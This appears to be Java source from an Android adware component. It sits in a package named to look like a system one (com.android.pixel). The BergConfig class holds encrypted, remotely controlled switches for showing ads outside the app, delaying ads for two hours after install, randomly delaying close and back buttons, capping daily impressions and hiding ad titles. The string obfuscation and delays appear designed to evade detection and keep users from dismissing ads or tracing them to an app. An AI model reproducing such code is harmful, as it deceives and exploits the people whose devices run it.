package com.android.pixel;

import android.util.Log;

import com.EncryptStr;

import org.json.JSONArray;

import java.util.Random;

public class BergConfig {
    private static volatile BergConfig sInst = null;
    public static BergConfig getInst(){
        if(sInst==null){
            synchronized (BergConfig.class){
                if(sInst==null){
                    sInst = new BergConfig();
                }
            }
        }

        return sInst;
    }

    private BergConfig(){

    }

    @EncryptStr(value = "adOutApp")
    private final static String adOutApp_key = "qsX0iI2C2xnRl3R2d1ir0w" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergConfig.adOutApp_key:-->"+FunctionUtil.encrypt("adOutApp")+"<--");
            Log.d("verify", adOutApp_key+"-->"+FunctionUtil.decrypt(adOutApp_key)+"<--");
        }
    }
    public boolean isAdOutAppEnabled(){
        //combine to "berg_adOutApp"
        String key = BergManager.getDecryptTag()
                +"_"+FunctionUtil.decrypt(adOutApp_key);
        boolean remoteConfig = ServerConfigManager.getInst().getConfigBoolean(key, AppUtil.sDebug);
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+remoteConfig+" to true for key="+key);
            return true;
        }
        return remoteConfig;
    }


    @EncryptStr(value = "newUserAdDelayT")
    private final static String newUserAdDelayT_key = "o9xizSrn3q3j/ie6xtTwPQ" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergConfig.newUserAdDelayT_key:-->"+FunctionUtil.encrypt("newUserAdDelayT")+"<--");
            Log.d("verify", newUserAdDelayT_key+"-->"+FunctionUtil.decrypt(newUserAdDelayT_key)+"<--");
        }
    }

    /**
     * the seconds of showing ad after installation
     * @return
     */
    public long getNewUserAdDelayT(){
        //combine to "berg_newUserAdDelayT"
        String key = BergManager.getDecryptTag()
                +"_"+FunctionUtil.decrypt(newUserAdDelayT_key);
        long remoteConfig = ServerConfigManager.getInst().getConfigLong(key, AppUtil.sDebug ? 0L:7200L);
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+remoteConfig+" to 0 for key="+key);
            return 0;
        }

        return remoteConfig;
    }


    @EncryptStr(value = "maxNum")
    private final static String maxNum_key = "IJFdEdgGHfq4hEgii4sbEQ" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergConfig.maxNum_key:-->"+FunctionUtil.encrypt("maxNum")+"<--");
            Log.d("verify", maxNum_key+"-->"+FunctionUtil.decrypt(maxNum_key)+"<--");
        }
    }
    public long getImpDailyLimit(){
        //combine to "berg_maxNum"
        String key = BergManager.getDecryptTag()//+BergManager.getDecryptIntPlc()
                +"_"+FunctionUtil.decrypt(maxNum_key);
        long config = ServerConfigManager.getInst().getConfigLong(key, AppUtil.sDebug? 150L:30L);
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+config+" to 150 for key="+key);
            return 150;
        }
        return config;
    }




    public long getImpDailyLimitNetwork(AdNetwork network){
        //combine to "berg_maxNum_fan"
        String key = BergManager.getDecryptTag()//+BergManager.getDecryptIntPlc()
                +"_"+FunctionUtil.decrypt(maxNum_key)
                +"_"+FunctionUtil.decrypt(network.toString());
        long config = ServerConfigManager.getInst().getConfigLong(key, AppUtil.sDebug? 15L:10L);
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+config+" to 15 for key="+key);
            return 15;
        }
        return config;
    }




    @EncryptStr(value = "btnDelay")
    private final static String btnDelay_key= "3aakfjVTGhAxWZxb/vNVlw" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergConfig.btnDelay_key:-->"+FunctionUtil.encrypt("btnDelay")+"<--");
            Log.d("verify", btnDelay_key+"-->"+FunctionUtil.decrypt(btnDelay_key)+"<--");
        }
    }
    public long getInnerCloseBtnDelay(){
        //combine to "bergInner_btnDelay"
        String key = BergManager.getDecryptTag()+BergInner.getDecryptInnerPlc()
                +"_"+FunctionUtil.decrypt(btnDelay_key);
        /**
         * random delay range:[0,7]s
         */
        long delay = new Random(System.currentTimeMillis()).nextInt(8);
        long config = ServerConfigManager.getInst().getConfigLong(key, AppUtil.sDebug? 8L:delay);
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+config+" to 8 for key="+key);
            return 8;
        }

        return config;
    }


    @EncryptStr(value = "popReturnDelay")
    private final static String popReturnDelay_key = "zNrjArbrecAGTWL8HdBOtw" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergConfig.popReturnDelay_key:-->"+FunctionUtil.encrypt("popReturnDelay")+"<--");
            Log.d("verify", popReturnDelay_key+"-->"+FunctionUtil.decrypt(popReturnDelay_key)+"<--");
        }
    }
    public long getIntBackBtnDelay(){
        //combine to "bergInt_popReturnDelay"
        String key = BergManager.getDecryptTag()+BergPopup.getDecryptIntPlc()
                +"_"+FunctionUtil.decrypt(popReturnDelay_key);
        /**
         * random delay range:[1,20]s
         */
        long delay = new Random(System.currentTimeMillis()).nextInt(20)+1;
        long config = ServerConfigManager.getInst().getConfigLong(key, AppUtil.sDebug? 10L:delay);
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+config+" to 10 for key="+key);
            return 10;
        }

        return config;
    }



    @EncryptStr(value = "pr")
    private final static String probability_key = "RdhuEK5rnVYiIqKZmpfgqA" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergConfig.probability_key:-->"+FunctionUtil.encrypt("pr")+"<--");
            Log.d("verify", probability_key+"-->"+FunctionUtil.decrypt(probability_key)+"<--");
        }
    }

    /**
     *
     * @param time 0~23
     * @return
     */
    public long getProbabilityTimeframe(int time){
        //combine to "berg_pr"
        String key = BergManager.getDecryptTag()
                +"_"+FunctionUtil.decrypt(probability_key);
        String config = ServerConfigManager.getInst().getConfigString(key);

        long prob = 100;
        try{
            JSONArray configArray = new JSONArray(config);
            prob = configArray.optLong(time, 100);
        } catch (Throwable e){
            //if(AppUtil.sDebug) e.printStackTrace();
        }
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+prob+" to 100 for key="+key);
            return 100;
        }
        return prob;
    }


    public long getBergInnerProbability(){
        //combine to "bergInner_pr"
        String key = BergManager.getDecryptTag()+BergInner.getDecryptInnerPlc()
                +"_"+FunctionUtil.decrypt(probability_key);
        long config = ServerConfigManager.getInst().getConfigLong(key, AppUtil.sDebug ? 24L:25);
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+config+" to 24 for key="+key);
            return 24;
        }

        return config;
    }


    @EncryptStr(value = "ads_hideTitle")
    private final static String adsHideTitle_key= "C/zdb+jsjcACvK2UUACLTw" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergConfig.adsHideTitle_key:-->"+FunctionUtil.encrypt("ads_hideTitle")+"<--");
            Log.d("verify", adsHideTitle_key+"-->"+FunctionUtil.decrypt(adsHideTitle_key)+"<--");
        }
    }
    public boolean isAdsHideTitleEnable(){
        String key = FunctionUtil.decrypt(adsHideTitle_key);
        boolean remoteConfig = ServerConfigManager.getInst().getConfigBoolean(key, AppUtil.sDebug);
        if(AppUtil.sDebug){
            Log.d("BergConfig", "for debug, change remote config val="+remoteConfig+" to true for key="+key);
            return true;
        }
        return remoteConfig;
    }
}
